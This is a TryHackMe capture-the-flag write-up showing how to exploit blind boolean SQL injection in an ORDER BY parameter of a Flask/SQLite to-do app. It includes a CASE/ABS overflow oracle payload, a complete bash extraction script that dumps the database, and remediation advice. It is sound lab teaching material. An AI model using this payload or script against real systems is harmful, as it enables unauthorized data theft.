# Prioritise — TryHackMe Writeup

> **Room:** Prioritise
> **Platform:** TryHackMe
> **Category:** Web · SQL Injection
> **Difficulty:** Easy/Medium

A small Flask "to-do list" app hides a SQL injection in an `ORDER BY` clause — a spot where the usual `UNION SELECT` just doesn't work. The database is SQLite and the server leaks no error messages, so the flag has to be pulled out with a **blind boolean** technique, using the difference between `200 OK` and `500 Internal Server Error` as a yes/no oracle. That's exactly what the room means by "less common SQL injection techniques."

---

## Table of Contents
1. [Enumeration](#1-enumeration)
2. [Web Recon](#2-web-recon)
3. [Finding the Injection](#3-finding-the-injection--order-by)
4. [Why UNION Won't Work](#4-why-its-a-less-common-technique)
5. [Building the Boolean Oracle](#5-building-the-boolean-oracle)
6. [Automating Blind Extraction](#6-automating-blind-extraction)
7. [Dumping the Database](#7-dumping-the-database--the-flag)
8. [Remediation](#8-remediation)
9. [Conclusion](#conclusion)

---

## 1. Enumeration

Standard `nmap` to start:

```bash
nmap -sC -sV -T4 -p- 10.80.152.47
```

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    (title: "Prioritise")
```

Only two ports: **22 (SSH)** and **80 (HTTP)**. SSH is parked for later — everything interesting is on port 80.

> **Note:** `nmap` labelled port 80 as `rtsp` and the script errored out. That's just the Flask dev server replying `200 OK` to the `OPTIONS`/`RTSP` method. It's plain HTTP — don't get distracted by "rtsp".

## 2. Web Recon

The site is a to-do list app called **Prioritise**, running on **Flask (Python)**. Mapping the endpoints:

- `GET  /` — lists the tasks and shows a status banner
- `POST /new` — creates a task (`title` + `date`)
- `GET  /delete/<id>` — the "Delete" button on each task
- `GET  /?order=...` — a "Sort by" dropdown (`title`, `done`, `date`)

Before finding the right path, I tested and **ruled out** a bunch of things — writing those down is part of an honest methodology:

| What I tried | Result |
|---|---|
| `{{7*7}}` in `title` | returned literally → no SSTI |
| `<b>` in `title` | returned as `&lt;b&gt;` → escaped, no XSS |
| `{{7*7}}` / `<h1>` in the `success` param | escaped and not evaluated |
| invalid `date` | `500`, but the date is parsed and reformatted (`MM/DD/YYYY` → ISO) → no injection |
| `'` (quote) in `title` | `302`, stored safely → parameterized query |
| `/delete/<id>` with a quote | always redirects to `/?error=Invalid id` → guarded |
| `ffuf` (medium wordlist + 8 extensions) | **no** hidden routes |

Everything obvious is closed. What's left is the **`order`** parameter.

## 3. Finding the Injection — `ORDER BY`

The `order` parameter controls sorting, which smells like it's dropped straight into an `ORDER BY` clause. Testing it:

```bash
# valid column → OK
curl -si 'http://10.80.152.47/?order=title'      | head -n1   # 200 OK

# non-existent column → SQL complains
curl -si 'http://10.80.152.47/?order=NOPE'        | head -n1   # 500

# stray quote → syntax breaks
curl -si "http://10.80.152.47/?order=title'"      | head -n1   # 500
```

A valid column name runs; anything the SQL parser doesn't understand throws a `500`. **Confirmed: our input goes raw into the query.**

## 4. Why It's a "Less Common" Technique

Two things make this different from a textbook SQLi:

1. **You can't `UNION SELECT` inside an `ORDER BY`.** It's not syntactically valid. The most-taught trick is off the table.
2. **The server leaks no errors.** Flask debug mode is off — the `500` is generic, no traceback. So error-based extraction (reading the DB error message) is out too.

What's left is a **boolean oracle**. The query either runs (`200`) or breaks (`500`). If I can make the *result of a SQL condition* decide between running and breaking, that `200/500` becomes a **bit**: true or false. Enough bits and I can rebuild any value in the database.

## 5. Building the Boolean Oracle

The payload:

```sql
CASE WHEN (<condition>) THEN 1 ELSE ABS(-9223372036854775808) END
```

How it works:
- condition **true** → falls into `1` → `ORDER BY 1` is valid → **200**
- condition **false** → evaluates `ABS(-9223372036854775808)` → taking the absolute value of the smallest 64-bit integer throws an **"integer overflow"** in SQLite (a *runtime* error that only fires when that branch is actually reached) → **500**

Testing the oracle and fingerprinting the DB at the same time:

```bash
o(){ curl -s -o /dev/null -w "%{http_code}  <= $1\n" -G "http://10.80.152.47/" --data-urlencode "order=$1"; }

o 'sqlite_version()'                                         # 200 → it's SQLite
o 'CASE WHEN 1=1 THEN 1 ELSE ABS(-9223372036854775808) END'  # 200 → true
o 'CASE WHEN 1=2 THEN 1 ELSE ABS(-9223372036854775808) END'  # 500 → false
```

The `200 / 200 / 500` pattern confirms it: **the DB is SQLite** and **we have a reliable boolean oracle**.

## 6. Automating Blind Extraction

Doing this by hand is insane, so I scripted it. The idea: to read one character, ask "is its ASCII code greater than X?" and narrow the range with **binary search** (~7 requests per character). Same trick for the length.

```bash
B="http://10.80.152.47/"

# oracle: success(200)=TRUE, failure(500)=FALSE
cond(){
  local code
  code=$(curl -s -o /dev/null -w '%{http_code}' -G "$B" \
    --data-urlencode "order=CASE WHEN ($1) THEN 1 ELSE ABS(-9223372036854775808) END")
  [ "$code" = "200" ]
}

# length of a string expression
slen(){
  local e="$1" lo=0 hi=512 mid
  while [ $lo -lt $hi ]; do
    mid=$(( (lo+hi+1)/2 ))
    if cond "length(($e))>=$mid"; then lo=$mid; else hi=$((mid-1)); fi
  done
  echo $lo
}

# extract a string expression character by character
ex(){
  local e="$1" n i lo hi mid
  n=$(slen "$e"); printf '[len=%s] ' "$n" >&2
  for ((i=1;i<=n;i++)); do
    lo=32; hi=126
    while [ $lo -lt $hi ]; do
      mid=$(( (lo+hi)/2 ))
      if cond "unicode(substr(($e),$i,1))>$mid"; then lo=$((mid+1)); else hi=$mid; fi
    done
    printf "\\$(printf '%03o' "$lo")"
  done
  echo
}
```

> **Alternative:** you could also point `sqlmap` at the `order` parameter and force the boolean technique (`--technique=B`) with higher level/risk. But doing it by hand is what actually teaches the technique — and it's quicker to trust than tuning the tool for an `ORDER BY` context.

## 7. Dumping the Database & the Flag

Sanity check + list the tables:

```bash
ex "sqlite_version()"
# [len=6] 3.35.5

ex "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')"
# [len=10] todos,flag
```

A table literally called **`flag`**. Grab its structure, then its contents:

```bash
ex "(SELECT sql FROM sqlite_master WHERE name='flag')"
# [len=36] CREATE TABLE "flag" (  "flag" TEXT )

ex "(SELECT group_concat(flag) FROM flag)"
# [len=38] flag{REDACTED}
```

And the flag is rebuilt one character at a time. 🚩

## 8. Remediation

The bug comes from concatenating user input straight into a query. To fix it:

- **Never** put user input raw into an `ORDER BY`. Since you can't use bound parameters for column names, use an **allowlist**: map the permitted values (`title`, `done`, `date`) to real column names in code and reject anything else.
- Use **parameterized queries** (`?` placeholders) everywhere else — which the app actually already does correctly for `title`.
- In production, keep **debug mode off** (it was) and handle exceptions without exposing a behavioural difference that can be used as an oracle (ideally return the same response for valid and invalid input).

## Conclusion

Prioritise is a great reminder that SQL injection is a lot more than `' OR 1=1 --` and `UNION SELECT`. When the injection point is an `ORDER BY`, with no data echoed back and no error messages, you can still dump the whole database by turning a plain `200` vs `500` into a 1-bit channel. Patience, a good oracle, and binary search do the rest.

Thanks for reading, and happy hacking! 🙂
